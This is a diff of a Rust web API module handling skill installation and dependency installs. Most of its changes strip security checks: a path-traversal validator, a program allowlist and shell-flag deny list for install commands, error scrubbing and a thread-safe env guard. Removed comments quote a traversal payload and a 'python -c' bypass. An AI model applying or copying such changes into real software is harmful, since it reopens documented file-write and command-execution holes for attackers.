@@ -32,23 +32,6 @@ pub fn router() -> axum::Router<std::sync::Arc<super::AppState>> {
             axum::routing::post(evolve_write_file).delete(evolve_remove_file),
         )
         .route("/skills/{name}/file", axum::routing::get(get_supporting_file))
-        // Skill workshop (#3328) — passive after-turn capture review.
-        .route(
-            "/skills/pending",
-            axum::routing::get(list_pending_candidates),
-        )
-        .route(
-            "/skills/pending/{id}",
-            axum::routing::get(show_pending_candidate),
-        )
-        .route(
-            "/skills/pending/{id}/approve",
-            axum::routing::post(approve_pending_candidate),
-        )
-        .route(
-            "/skills/pending/{id}/reject",
-            axum::routing::post(reject_pending_candidate),
-        )
         // Marketplace / ClawHub
         .route(
             "/marketplace/search",
@@ -228,8 +211,7 @@ pub fn router() -> axum::Router<std::sync::Arc<super::AppState>> {
         .route("/extensions/{name}", axum::routing::get(get_extension))
 }
 
-// `super::channels::FieldType` import removed alongside
-// the channel-config write helpers that consumed it.
+use super::channels::FieldType;
 use super::config::json_to_toml_value;
 use super::AppState;
 use super::RequestLanguage;
@@ -248,17 +230,6 @@ use std::time::Instant;
 // Skills endpoints
 // ---------------------------------------------------------------------------
 
-/// Query parameters for `GET /api/skills`. Combines the existing
-/// `?category=` filter with the canonical `?offset=&limit=` pagination
-/// from `PaginationQuery` (#3639). Server caps `limit` at
-/// `PAGINATION_MAX_LIMIT` (= 100).
-#[derive(Debug, Default, serde::Deserialize)]
-pub struct ListSkillsQuery {
-    pub category: Option<String>,
-    pub offset: Option<usize>,
-    pub limit: Option<usize>,
-}
-
 /// GET /api/skills — List installed skills.
 ///
 /// `categories` always reflects all skills regardless of the `?category=` filter.
@@ -272,7 +243,7 @@ pub struct ListSkillsQuery {
 )]
 pub async fn list_skills(
     State(state): State<Arc<AppState>>,
-    Query(params): Query<ListSkillsQuery>,
+    Query(params): Query<std::collections::HashMap<String, String>>,
 ) -> impl IntoResponse {
     // Use the kernel's LIVE registry so `skills.disabled` and
     // `skills.extra_dirs` from config.toml take effect on this
@@ -286,7 +257,7 @@ pub async fn list_skills(
         .read()
         .unwrap_or_else(|e| e.into_inner());
 
-    let category_filter = params.category.as_deref();
+    let category_filter = params.get("category").map(|s| s.as_str());
 
     // Collect all categories first (unaffected by the filter), then apply filter.
     // Category derivation lives in `librefang_skills::registry::derive_category`
@@ -341,23 +312,14 @@ pub async fn list_skills(
         })
         .collect();
 
-    // Pagination (#3639): apply `?offset=&limit=` after the category filter
-    // and category-set computation, so `categories` always reflects the
-    // unfiltered registry while `items`/`total` reflect the filtered + paged
-    // view. Capped server-side at PAGINATION_MAX_LIMIT.
-    let pagination = crate::types::PaginationQuery {
-        offset: params.offset,
-        limit: params.limit,
-    };
-    let (items, total, offset, limit) = pagination.paginate(skills);
     let categories_vec: Vec<String> = categories.into_iter().collect();
-    // Untyped JSON so `categories` can ride alongside the canonical
-    // PaginatedResponse fields without a new struct.
+    let total = skills.len();
+    // Untyped JSON so `categories` can be added alongside PaginatedResponse fields without a new struct.
     Json(serde_json::json!({
-        "items": items,
+        "items": skills,
         "total": total,
-        "offset": offset,
-        "limit": limit,
+        "offset": 0,
+        "limit": serde_json::Value::Null,
         "categories": categories_vec,
     }))
 }
@@ -376,30 +338,6 @@ pub async fn install_skill(
     State(state): State<Arc<AppState>>,
     Json(req): Json<SkillInstallRequest>,
 ) -> impl IntoResponse {
-    // Reject path-traversal payloads on BOTH `name` and `hand` before
-    // letting either reach `Path::join`. Pre-fix the handler did
-    // `home.join("registry").join("skills").join(&req.name)` and
-    // `home.join("workspaces").join("hands").join(hand_id)` with no
-    // rejection of `..` / `/` / `\`, so a payload like
-    // `{"name":"../../etc/cron.daily/payload"}` would (a) leak FS
-    // existence via the `.exists()` probe (200 / 404 oracle) and (b)
-    // let `copy_dir_recursive` write outside `~/.librefang/skills/`
-    // (full filesystem write under the daemon UID). The sibling
-    // `uninstall_skill` at `librefang-skills/src/evolution.rs:1277`
-    // already hardens uninstall — this brings install in line. The
-    // validator below matches the project's strict pattern from
-    // `agent_templates.rs:113-124` (alphanumeric + `_` + `-`, ≤ 64
-    // chars, no leading `.`). (audit:
-    // skill-install-path-traversal)
-    if let Err(reason) = validate_skill_identifier(&req.name, "name") {
-        return ApiErrorResponse::bad_request(reason).into_json_tuple();
-    }
-    if let Some(ref hand_id) = req.hand {
-        if let Err(reason) = validate_skill_identifier(hand_id, "hand") {
-            return ApiErrorResponse::bad_request(reason).into_json_tuple();
-        }
-    }
-
     let home = state.kernel.home_dir();
     let skills_dir = if let Some(ref hand_id) = req.hand {
         let hand_dir = home.join("workspaces").join("hands").join(hand_id);
@@ -412,7 +350,8 @@ pub async fn install_skill(
         home.join("skills")
     };
     if let Err(e) = std::fs::create_dir_all(&skills_dir) {
-        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
+        return ApiErrorResponse::internal(format!("Failed to create skills dir: {e}"))
+            .into_json_tuple();
     }
 
     // Install from local registry (~/.librefang/registry/skills/{name}/)
@@ -457,7 +396,7 @@ pub async fn install_skill(
             tracing::warn!("Skill install failed: {e}");
             // Clean up partial copy
             let _ = std::fs::remove_dir_all(&dest);
-            ApiErrorResponse::internal_scrub(e).into_json_tuple()
+            ApiErrorResponse::internal(format!("Install failed: {e}")).into_json_tuple()
         }
     }
 }
@@ -523,304 +462,6 @@ pub async fn reload_skills(State(state): State<Arc<AppState>>) -> impl IntoRespo
     )
 }
 
-// ─── Skill workshop pending review (#3328) ──────────────────────────
-
-#[derive(Debug, serde::Deserialize, utoipa::IntoParams)]
-pub struct PendingListQuery {
-    /// Optional agent UUID filter. When set, only candidates from that
-    /// agent are returned. Omit for a workspace-wide list.
-    #[serde(default)]
-    pub agent: Option<String>,
-}
-
-/// GET /api/skills/pending — list skill-workshop pending candidates,
-/// oldest captured first. Optionally filtered by agent.
-#[utoipa::path(
-    get,
-    path = "/api/skills/pending",
-    tag = "skills",
-    params(PendingListQuery),
-    responses(
-        (status = 200, description = "List pending workshop candidates", body = crate::types::JsonObject)
-    )
-)]
-pub async fn list_pending_candidates(
-    State(state): State<Arc<AppState>>,
-    axum::extract::Query(q): axum::extract::Query<PendingListQuery>,
-) -> impl IntoResponse {
-    let skills_root = state.kernel.home_dir().join("skills");
-    let result = match q.agent.as_deref() {
-        Some(agent) => librefang_kernel::skill_workshop::storage::list_pending(&skills_root, agent),
-        None => librefang_kernel::skill_workshop::storage::list_pending_all(&skills_root),
-    };
-    match result {
-        Ok(candidates) => (
-            StatusCode::OK,
-            Json(serde_json::json!({"candidates": candidates})),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::InvalidId(id)) => (
-            StatusCode::BAD_REQUEST,
-            Json(serde_json::json!({"error": format!("invalid agent id (must be a UUID): {id}")})),
-        ),
-        Err(e) => (
-            StatusCode::INTERNAL_SERVER_ERROR,
-            Json(serde_json::json!({"error": format!("failed to read pending dir: {e}")})),
-        ),
-    }
-}
-
-/// GET /api/skills/pending/{id} — return a single pending candidate by id.
-#[utoipa::path(
-    get,
-    path = "/api/skills/pending/{id}",
-    tag = "skills",
-    params(
-        ("id" = String, Path, description = "Candidate UUID")
-    ),
-    responses(
-        (status = 200, description = "Pending candidate detail", body = crate::types::JsonObject),
-        (status = 404, description = "Candidate not found", body = crate::types::JsonObject)
-    )
-)]
-pub async fn show_pending_candidate(
-    State(state): State<Arc<AppState>>,
-    axum::extract::Path(id): axum::extract::Path<String>,
-) -> impl IntoResponse {
-    let skills_root = state.kernel.home_dir().join("skills");
-    match librefang_kernel::skill_workshop::storage::load_candidate(&skills_root, &id) {
-        Ok(candidate) => (
-            StatusCode::OK,
-            Json(serde_json::json!({"candidate": candidate})),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::InvalidId(_)) => (
-            StatusCode::BAD_REQUEST,
-            Json(
-                serde_json::json!({"error": format!("invalid candidate id (must be a UUID): {id}")}),
-            ),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::NotFound(_)) => (
-            StatusCode::NOT_FOUND,
-            Json(serde_json::json!({"error": format!("candidate '{id}' not found")})),
-        ),
-        Err(e) => (
-            StatusCode::INTERNAL_SERVER_ERROR,
-            Json(serde_json::json!({"error": format!("failed to load candidate: {e}")})),
-        ),
-    }
-}
-
-/// POST /api/skills/pending/{id}/approve — promote a pending candidate
-/// into the active skill registry via `evolution::create_skill`.
-#[utoipa::path(
-    post,
-    path = "/api/skills/pending/{id}/approve",
-    tag = "skills",
-    params(
-        ("id" = String, Path, description = "Candidate UUID")
-    ),
-    responses(
-        (status = 200, description = "Candidate promoted to active skill", body = crate::types::JsonObject),
-        (status = 404, description = "Candidate not found", body = crate::types::JsonObject),
-        (status = 409, description = "Promotion blocked (security scan or naming collision)", body = crate::types::JsonObject)
-    )
-)]
-pub async fn approve_pending_candidate(
-    State(state): State<Arc<AppState>>,
-    axum::extract::Path(id): axum::extract::Path<String>,
-) -> impl IntoResponse {
-    let skills_root = state.kernel.home_dir().join("skills");
-    match librefang_kernel::skill_workshop::storage::approve_candidate(
-        &skills_root,
-        &skills_root,
-        &id,
-    ) {
-        Ok(result) => {
-            // Successful promotion landed a new directory under
-            // `skills_root`; refresh the in-memory registry so the next
-            // turn's prompt build sees the new skill.
-            state.kernel.reload_skills();
-            (
-                StatusCode::OK,
-                Json(serde_json::json!({
-                    "status": "approved",
-                    "candidate_id": id,
-                    "skill_name": result.skill_name,
-                    "version": result.version,
-                    "message": result.message,
-                })),
-            )
-        }
-        Err(librefang_kernel::skill_workshop::WorkshopError::InvalidId(_)) => (
-            StatusCode::BAD_REQUEST,
-            Json(
-                serde_json::json!({"error": format!("invalid candidate id (must be a UUID): {id}")}),
-            ),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::NotFound(_)) => (
-            StatusCode::NOT_FOUND,
-            Json(serde_json::json!({"error": format!("candidate '{id}' not found")})),
-        ),
-        Err(e @ librefang_kernel::skill_workshop::WorkshopError::SecurityBlocked(_)) => (
-            StatusCode::CONFLICT,
-            Json(serde_json::json!({"error": e.to_string()})),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::Skill(
-            librefang_skills::SkillError::AlreadyInstalled(skill_name),
-        )) => {
-            // `AlreadyInstalled` from `evolution::create_skill` is
-            // ambiguous and we MUST NOT collapse the two cases:
-            //
-            //   * Phantom pending — a previous approve of THIS candidate
-            //     promoted the skill but the pending-file cleanup failed
-            //     transiently (Windows AV holding a handle, read-only
-            //     mount mid-clean-up). The active body is byte-identical
-            //     to the candidate's `prompt_context`. Idempotent
-            //     recovery: drop the pending row, return 200
-            //     `already_promoted`.
-            //   * Name collision — the user already has an unrelated
-            //     skill with the same name (manual install, marketplace,
-            //     prior `evolve`, or a `synth_name` fallback collision).
-            //     The active body differs from the candidate body.
-            //     Silently dropping the pending row in this case would
-            //     destroy the candidate the user wanted reviewed without
-            //     them ever seeing it — a real data-loss bug. Return 409
-            //     and KEEP the pending file so the reviewer can rename
-            //     and retry.
-            //
-            // Decide by reading the active skill's `prompt_context.md`
-            // and comparing byte-for-byte against the candidate's stored
-            // `prompt_context` (`evolution::create_skill` writes the
-            // string verbatim — no trim, no normalisation — so equality
-            // is well-defined). If we cannot load the candidate (e.g.
-            // it was already cleaned up by a concurrent reject), the
-            // recovery target state is reached anyway → 200.
-            let candidate = match librefang_kernel::skill_workshop::storage::load_candidate(
-                &skills_root,
-                &id,
-            ) {
-                Ok(c) => Some(c),
-                Err(librefang_kernel::skill_workshop::WorkshopError::NotFound(_)) => None,
-                Err(e) => {
-                    return (
-                        StatusCode::INTERNAL_SERVER_ERROR,
-                        Json(serde_json::json!({
-                            "error": format!(
-                                "Active skill '{skill_name}' already exists; failed to read candidate to disambiguate phantom vs collision: {e}"
-                            ),
-                        })),
-                    );
-                }
-            };
-            let bodies_match = match &candidate {
-                None => true, // Concurrent cleanup beat us — terminal state already reached.
-                Some(cand) => {
-                    let active_body_path = skills_root.join(&skill_name).join("prompt_context.md");
-                    match std::fs::read_to_string(&active_body_path) {
-                        Ok(active) => active == cand.prompt_context,
-                        // If we can't read the active body we cannot prove
-                        // it's a phantom — fall through to the collision
-                        // branch so we never drop the pending file.
-                        Err(_) => false,
-                    }
-                }
-            };
-            if bodies_match {
-                // Phantom recovery. `NotFound` from the nested reject is
-                // the desired terminal state (a concurrent reject / CLI
-                // cleanup beat us to the row), not a failure.
-                match librefang_kernel::skill_workshop::storage::reject_candidate(&skills_root, &id)
-                {
-                    Ok(()) | Err(librefang_kernel::skill_workshop::WorkshopError::NotFound(_)) => (
-                        StatusCode::OK,
-                        Json(serde_json::json!({
-                            "status": "already_promoted",
-                            "candidate_id": id,
-                            "skill_name": skill_name,
-                            "message": format!(
-                                "Active skill '{skill_name}' already exists with the same body; pending entry cleared.",
-                            ),
-                        })),
-                    ),
-                    Err(e) => (
-                        StatusCode::INTERNAL_SERVER_ERROR,
-                        Json(serde_json::json!({
-                            "error": format!(
-                                "Active skill '{skill_name}' already exists, but failed to clear pending entry: {e}"
-                            ),
-                        })),
-                    ),
-                }
-            } else {
-                // Real name collision. Pending file is intentionally
-                // left in place so the reviewer can rename and retry
-                // without losing their candidate.
-                (
-                    StatusCode::CONFLICT,
-                    Json(serde_json::json!({
-                        "error": format!(
-                            "Skill '{skill_name}' already exists with different content. \
-                             Edit the candidate's `name` field in its pending TOML \
-                             (or reject it and capture again under a different rule) and retry."
-                        ),
-                        "kind": "name_collision",
-                        "candidate_id": id,
-                        "skill_name": skill_name,
-                    })),
-                )
-            }
-        }
-        Err(librefang_kernel::skill_workshop::WorkshopError::Skill(e)) => (
-            StatusCode::CONFLICT,
-            Json(serde_json::json!({"error": format!("promotion rejected: {e}")})),
-        ),
-        Err(e) => (
-            StatusCode::INTERNAL_SERVER_ERROR,
-            Json(serde_json::json!({"error": format!("failed to approve candidate: {e}")})),
-        ),
-    }
-}
-
-/// POST /api/skills/pending/{id}/reject — drop a pending candidate
-/// without promoting.
-#[utoipa::path(
-    post,
-    path = "/api/skills/pending/{id}/reject",
-    tag = "skills",
-    params(
-        ("id" = String, Path, description = "Candidate UUID")
-    ),
-    responses(
-        (status = 200, description = "Candidate dropped", body = crate::types::JsonObject),
-        (status = 404, description = "Candidate not found", body = crate::types::JsonObject)
-    )
-)]
-pub async fn reject_pending_candidate(
-    State(state): State<Arc<AppState>>,
-    axum::extract::Path(id): axum::extract::Path<String>,
-) -> impl IntoResponse {
-    let skills_root = state.kernel.home_dir().join("skills");
-    match librefang_kernel::skill_workshop::storage::reject_candidate(&skills_root, &id) {
-        Ok(()) => (
-            StatusCode::OK,
-            Json(serde_json::json!({"status": "rejected", "candidate_id": id})),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::InvalidId(_)) => (
-            StatusCode::BAD_REQUEST,
-            Json(
-                serde_json::json!({"error": format!("invalid candidate id (must be a UUID): {id}")}),
-            ),
-        ),
-        Err(librefang_kernel::skill_workshop::WorkshopError::NotFound(_)) => (
-            StatusCode::NOT_FOUND,
-            Json(serde_json::json!({"error": format!("candidate '{id}' not found")})),
-        ),
-        Err(e) => (
-            StatusCode::INTERNAL_SERVER_ERROR,
-            Json(serde_json::json!({"error": format!("failed to reject candidate: {e}")})),
-        ),
-    }
-}
-
 /// GET /api/skills/registry — List official skills from the local registry cache (~/.librefang/registry/skills).
 #[utoipa::path(
     get,
@@ -878,49 +519,6 @@ pub async fn list_skill_registry(State(state): State<Arc<AppState>>) -> impl Int
 
     let total = skills.len();
     Json(serde_json::json!({ "skills": skills, "total": total }))
-}
-
-/// Path-traversal hardening for `install_skill` (audit:
-/// skill-install-path-traversal). Used on both `req.name` (joined
-/// onto `registry/skills/`) and `req.hand` (joined onto
-/// `workspaces/hands/`).
-///
-/// Contract:
-/// - non-empty, ≤ 64 chars (caps log noise and matches the project
-///   pattern from `agent_templates.rs::validate_template_name`)
-/// - characters limited to `[A-Za-z0-9_-]` — the strictest project
-///   convention; cannot contain `..`, `/`, `\`, or any platform
-///   path separator
-/// - first character must be alphanumeric — rejects `-foo` and
-///   `_foo` (option-arg / dotfile-style ambiguity) and `.foo`
-///   (leading-dot dotfile)
-///
-/// `field` is "name" or "hand" — used to scope the rejection
-/// message so the client knows which input was bad.
-fn validate_skill_identifier(value: &str, field: &str) -> Result<(), String> {
-    if value.is_empty() || value.len() > 64 {
-        return Err(format!(
-            "invalid skill {field}: must be 1-64 characters, got {} chars",
-            value.len()
-        ));
-    }
-    let all_safe = value
-        .chars()
-        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
-    if !all_safe {
-        return Err(format!(
-            "invalid skill {field}: only [A-Za-z0-9_-] allowed (no path separators, dots, or other punctuation)"
-        ));
-    }
-    // First-char-alphanumeric rule (rejects leading `-` / `_` /
-    // `.`). `.empty()` is impossible here — we just bounded above.
-    let first = value.chars().next().expect("non-empty checked above");
-    if !first.is_ascii_alphanumeric() {
-        return Err(format!(
-            "invalid skill {field}: must start with an alphanumeric character"
-        ));
-    }
-    Ok(())
 }
 
 /// Parse YAML frontmatter from a SKILL.md file. Returns `(name, description)`.
@@ -1405,64 +1003,6 @@ pub async fn clawhub_install(
 
     match client.install(&req.slug, &skills_dir).await {
         Ok(result) => {
-            // #4689 — patch source provenance to ClawHub. Without this, the
-            // installed skill's manifest.source stays None and `listSkills()`
-            // surfaces it as `source.type = "local"`, which makes the
-            // dashboard's per-hub `isInstalledFromMarketplace("clawhub", slug)`
-            // check miss the freshly installed skill — the hub's "Install"
-            // button keeps showing as clickable until the user reloads. The
-            // ClawHubCn handler already does this; bringing ClawHub in line.
-            let skill_dir = skills_dir.join(&req.slug);
-            let manifest_path = skill_dir.join("skill.toml");
-            if manifest_path.exists() {
-                match std::fs::read_to_string(&manifest_path) {
-                    Ok(toml_str) => {
-                        match toml::from_str::<librefang_skills::SkillManifest>(&toml_str) {
-                            Ok(mut manifest) => {
-                                manifest.source = Some(librefang_skills::SkillSource::ClawHub {
-                                    slug: req.slug.clone(),
-                                    version: result.version.clone(),
-                                });
-                                match toml::to_string_pretty(&manifest) {
-                                    Ok(updated) => {
-                                        if let Err(e) = std::fs::write(&manifest_path, updated) {
-                                            tracing::warn!(
-                                                slug = %req.slug,
-                                                path = %manifest_path.display(),
-                                                "Failed to write provenance to skill.toml: {e}"
-                                            );
-                                        }
-                                    }
-                                    Err(e) => {
-                                        tracing::warn!(
-                                            slug = %req.slug,
-                                            "Failed to serialize skill manifest for provenance patch: {e}"
-                                        );
-                                    }
-                                }
-                            }
-                            Err(e) => {
-                                tracing::warn!(
-                                    slug = %req.slug,
-                                    "Failed to parse skill.toml for provenance patch: {e}"
-                                );
-                            }
-                        }
-                    }
-                    Err(e) => {
-                        tracing::warn!(
-                            slug = %req.slug,
-                            path = %manifest_path.display(),
-                            "Failed to read skill.toml for provenance patch: {e}"
-                        );
-                    }
-                }
-            }
-
-            // Reload so the kernel sees the patched provenance immediately —
-            // mirrors what reload_skills() does for the FangHub install path.
-            state.kernel.reload_skills();
-
             let warnings: Vec<serde_json::Value> = result
                 .warnings
                 .iter()
@@ -2667,72 +2207,6 @@ pub async fn check_hand_deps(
     }
 }
 
-/// Package managers `install_hand_deps` is allowed to invoke.
-///
-/// Audit (`docs/issues/install-deps-rce-admin.md`): the historical
-/// metacharacter-only blocklist (`;|&$\`><(){}\n\r`) is bypassed when an
-/// Admin authors `install_deps = ["python", "-c", "import os; …"]` in a
-/// HAND.toml — the punctuation lands inside the quoted `-c` argument and
-/// `Command::new("python")` runs the interpreter under the daemon UID.
-/// Locking `parts[0]` to known package-manager binaries collapses that
-/// pathway: a language runtime / generic shell cannot be named here at
-/// all, so the `-c` payload has no executor.
-const INSTALL_DEPS_ALLOWED_PROGRAMS: &[&str] = &[
-    "apt", "apt-get", "dnf", "pacman", "brew", "winget", "pip", "pip3", "npm", "cargo",
-];
-
-/// Argument flags that turn an otherwise-safe binary into a generic
-/// code-execution sink. `pip`, `npm`, etc. legitimately never need these,
-/// so a bare match is sufficient — we also catch the `=value` long-form
-/// variants for the long flags. Compared case-insensitively against
-/// each `args` entry.
-const INSTALL_DEPS_DENIED_ARG_FLAGS: &[&str] =
-    &["-c", "-e", "--exec", "--shell", "--eval", "--command"];
-
-/// Long-flag prefixes (`--name=value`) that are equivalent to the
-/// denied bare flags above and must also be rejected.
-const INSTALL_DEPS_DENIED_ARG_PREFIXES: &[&str] = &["--exec=", "--shell=", "--eval=", "--command="];
-
-/// Validate the program + args extracted from a HAND.toml install command
-/// against the allowlist (program) and denylist (args). Returns the human
-/// reason on rejection so the per-dep result message stays informative;
-/// returns `Ok(())` on success.
-///
-/// Pure helper — no I/O, no globals — so the rejection rules can be
-/// exercised by `cargo test -p librefang-api` without booting a hand
-/// instance. The handler still loops over per-dep validation; this
-/// function only adjudicates one (program, args) tuple.
-fn validate_install_deps_argv(program: &str, args: &[&str]) -> Result<(), String> {
-    // Absolute paths defeat the allowlist: a HAND could name `/bin/sh`
-    // (Unix) or `\\?\C:\Windows\System32\cmd.exe` (Windows) and the
-    // allowlist would never match. Reject both shapes up front.
-    if program.starts_with('/') || program.contains('\\') {
-        return Err(format!(
-            "Install command program '{program}' uses an absolute path; \
-             only bare package-manager binary names are allowed"
-        ));
-    }
-    if !INSTALL_DEPS_ALLOWED_PROGRAMS.contains(&program) {
-        return Err(format!(
-            "Install command program '{program}' is not in install-deps allowlist ({})",
-            INSTALL_DEPS_ALLOWED_PROGRAMS.join(", ")
-        ));
-    }
-    if let Some(flag) = args.iter().find(|a| {
-        let lower = a.to_ascii_lowercase();
-        INSTALL_DEPS_DENIED_ARG_FLAGS.iter().any(|f| lower == *f)
-            || INSTALL_DEPS_DENIED_ARG_PREFIXES
-                .iter()
-                .any(|p| lower.starts_with(p))
-    }) {
-        return Err(format!(
-            "Install command contains disallowed flag '{flag}' \
-             (shell-invocation flags are blocked)"
-        ));
-    }
-    Ok(())
-}
-
 /// POST /api/hands/{hand_id}/install-deps — Auto-install missing dependencies for a hand.
 #[utoipa::path(
     post,
@@ -2852,30 +2326,8 @@ pub async fn install_hand_deps(
         let program = parts[0];
         let args = &parts[1..];
 
-        // Allowlist program names + reject shell-invocation flags. See
-        // `validate_install_deps_argv` for the rationale and the full
-        // allow/deny tables. Returns the *reason* string so the per-dep
-        // result still carries a useful message; the metacharacter guard
-        // above stays as a defence-in-depth predecessor (a `python -c`
-        // payload that includes `;` is caught earlier and never reaches
-        // this point).
-        if let Err(reason) = validate_install_deps_argv(program, args) {
-            results.push(serde_json::json!({
-                "key": req.key,
-                "status": "error",
-                "command": final_cmd,
-                "message": reason,
-            }));
-            continue;
-        }
-
         tracing::info!(hand = %hand_id, dep = %req.key, cmd = %final_cmd, "Auto-installing dependency");
 
-        // `kill_on_drop(true)` so a timeout / dropped Future SIGKILLs the
-        // child instead of orphaning it. Same defect class as codex fix
-        // #3 on the sidecar describe subprocess: a 300s `tokio::time::timeout`
-        // without `kill_on_drop` leaves the install command running in the
-        // background after the timeout fires.
         let output = match tokio::time::timeout(
             std::time::Duration::from_secs(300),
             tokio::process::Command::new(program)
@@ -2883,7 +2335,6 @@ pub async fn install_hand_deps(
                 .stdout(std::process::Stdio::piped())
                 .stderr(std::process::Stdio::piped())
                 .stdin(std::process::Stdio::null())
-                .kill_on_drop(true)
                 .output(),
         )
         .await
@@ -2991,12 +2442,14 @@ pub async fn install_hand_deps(
                 if !extra_paths.is_empty() {
                     let current_path = std::env::var("PATH").unwrap_or_default();
                     let new_path = format!("{};{}", extra_paths.join(";"), current_path);
-                    // Serialize the env mutation through the process-global
-                    // guard (#5142). `spawn_blocking` does NOT serialize — two
-                    // concurrent route handlers each get their own blocking
-                    // thread and `set_var` simultaneously, the exact race the
-                    // Rust 1.74+ docs forbid.
-                    crate::secrets_env::set_env_var_guarded("PATH", new_path).await;
+                    // `std::env::set_var` is not thread-safe in an async context;
+                    // push to a blocking thread to avoid UB in the tokio runtime.
+                    let new_path_clone = new_path.clone();
+                    let _ = tokio::task::spawn_blocking(move || {
+                        // SAFETY: single mutation on a dedicated blocking thread.
+                        unsafe { std::env::set_var("PATH", &new_path_clone) };
+                    })
+                    .await;
                     tracing::info!(
                         added = extra_paths.len(),
                         "Refreshed PATH with winget/pip directories"
@@ -3145,11 +2598,6 @@ fn hand_instance_to_json(instance: &librefang_hands::HandInstance) -> serde_json
 }
 
 /// POST /api/hands/{hand_id}/activate — Activate a hand (spawns agent).
-///
-/// Honours `Idempotency-Key` (#3637): when set, a duplicate request
-/// with the same key + same body replays the cached response instead
-/// of activating a second hand instance. A different body under the
-/// same key is rejected with 409 Conflict.
 #[utoipa::path(
     post,
     path = "/api/hands/{hand_id}/activate",
@@ -3159,45 +2607,15 @@ fn hand_instance_to_json(instance: &librefang_hands::HandInstance) -> serde_json
     ),
     request_body = crate::types::JsonObject,
     responses(
-        (status = 200, description = "Activate a hand (spawns agent)", body = crate::types::JsonObject),
-        (status = 409, description = "Idempotency-Key was reused with a different request body")
+        (status = 200, description = "Activate a hand (spawns agent)", body = crate::types::JsonObject)
     )
 )]
 pub async fn activate_hand(
     State(state): State<Arc<AppState>>,
     Path(hand_id): Path<String>,
-    headers: axum::http::HeaderMap,
-    body: axum::body::Bytes,
-) -> axum::response::Response {
-    let key = crate::idempotency::extract_key(&headers);
-    let body_bytes: Vec<u8> = body.to_vec();
-    let store = Arc::clone(&state.idempotency_store);
-    let inner_body = body_bytes.clone();
-
-    crate::idempotency::run_idempotent(
-        store.as_ref(),
-        key.as_deref(),
-        &body_bytes,
-        move || async move { activate_hand_inner(state, hand_id, &inner_body).await },
-    )
-    .await
-}
-
-/// Inner handler — produces a `(StatusCode, Vec<u8>)` snapshot suitable
-/// for caching by the Idempotency-Key middleware.
-async fn activate_hand_inner(
-    state: Arc<AppState>,
-    hand_id: String,
-    body_bytes: &[u8],
-) -> (StatusCode, Vec<u8>) {
-    let config = if body_bytes.is_empty() {
-        std::collections::HashMap::new()
-    } else {
-        match serde_json::from_slice::<librefang_hands::ActivateHandRequest>(body_bytes) {
-            Ok(req) => req.config,
-            Err(_) => std::collections::HashMap::new(),
-        }
-    };
+    body: Option<Json<librefang_hands::ActivateHandRequest>>,
+) -> impl IntoResponse {
+    let config = body.map(|b| b.0.config).unwrap_or_default();
 
     match state.kernel.activate_hand(&hand_id, config) {
         Ok(instance) => {
@@ -3215,7 +2633,7 @@ async fn activate_hand_inner(
                         entry.manifest.schedule,
                         librefang_types::agent::ScheduleMode::Reactive
                     ) {
-                        state.kernel.clone().start_background_for_agent(
+                        state.kernel.start_background_for_agent(
                             agent_id,
                             &entry.name,
                             &entry.manifest.schedule,
@@ -3223,17 +2641,9 @@ async fn activate_hand_inner(
                     }
                 }
             }
-            let body = serde_json::to_vec(&hand_instance_to_json(&instance))
-                .unwrap_or_else(|_| b"{}".to_vec());
-            (StatusCode::OK, body)
+            (StatusCode::OK, Json(hand_instance_to_json(&instance)))
         }
-        Err(e) => {
-            let payload = serde_json::json!({"error": format!("{e}"), "code": "activate_hand_failed", "type": "activate_hand_failed"});
-            (
-                StatusCode::BAD_REQUEST,
-                serde_json::to_vec(&payload).unwrap_or_default(),
-            )
-        }
+        Err(e) => ApiErrorResponse::bad_request(format!("{e}")).into_json_tuple(),
     }
 }
 
@@ -3375,13 +2785,22 @@ pub async fn set_hand_secret(
     // Write to secrets.env
     let secrets_path = state.kernel.home_dir().join("secrets.env");
     if let Err(e) = write_secret_env(&secrets_path, &env_key, &value) {
-        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
+        return ApiErrorResponse::internal(format!("Failed to write secret: {e}"))
+            .into_json_tuple();
     }
 
-    // Set in current process. Serialized through the process-global env
-    // write guard (#5142) — `spawn_blocking` does NOT serialize concurrent
-    // env mutations, it fans out across the blocking pool.
-    crate::secrets_env::set_env_var_guarded(env_key.clone(), value.clone()).await;
+    // Set in current process.
+    // `std::env::set_var` is not thread-safe in an async context; delegate to
+    // a blocking thread to avoid UB in the multithreaded tokio runtime.
+    {
+        let env_key_clone = env_key.clone();
+        let value_clone = value.clone();
+        let _ = tokio::task::spawn_blocking(move || {
+            // SAFETY: single mutation on a dedicated blocking thread.
+            unsafe { std::env::set_var(&env_key_clone, &value_clone) };
+        })
+        .await;
+    }
 
     (
         StatusCode::OK,
@@ -3640,7 +3059,7 @@ pub async fn hand_instance_browser(
         .browser()
         .send_command(
             &agent_id_str,
-            librefang_kernel::browser::BrowserCommand::ReadPage,
+            librefang_runtime::browser::BrowserCommand::ReadPage,
         )
         .await
     {
@@ -3670,7 +3089,7 @@ pub async fn hand_instance_browser(
         .browser()
         .send_command(
             &agent_id_str,
-            librefang_kernel::browser::BrowserCommand::Screenshot,
+            librefang_runtime::browser::BrowserCommand::Screenshot,
         )
         .await
     {
@@ -3740,12 +3159,12 @@ pub async fn hand_send_message(
         Err(e) => return e,
     };
 
-    // Reject oversized messages — see check_message_size for the
-    // byte/char split. Audit: message-byte-vs-char-cap.
-    if let Err(e) = crate::validation::check_message_size(&req.message) {
+    // Reject oversized messages
+    const MAX_MESSAGE_SIZE: usize = 64 * 1024;
+    if req.message.len() > MAX_MESSAGE_SIZE {
         return (
             StatusCode::PAYLOAD_TOO_LARGE,
-            Json(serde_json::json!({"error": e.message})),
+            Json(serde_json::json!({"error": "Message too large (max 64KB)"})),
         );
     }
 
@@ -3753,11 +3172,7 @@ pub async fn hand_send_message(
     if !req.attachments.is_empty() {
         let image_blocks = super::agents::resolve_attachments(&state, &req.attachments);
         if !image_blocks.is_empty() {
-            super::agents::inject_attachments_into_session(
-                state.kernel.as_ref(),
-                agent_id,
-                image_blocks,
-            );
+            super::agents::inject_attachments_into_session(&state.kernel, agent_id, image_blocks);
         }
     }
 
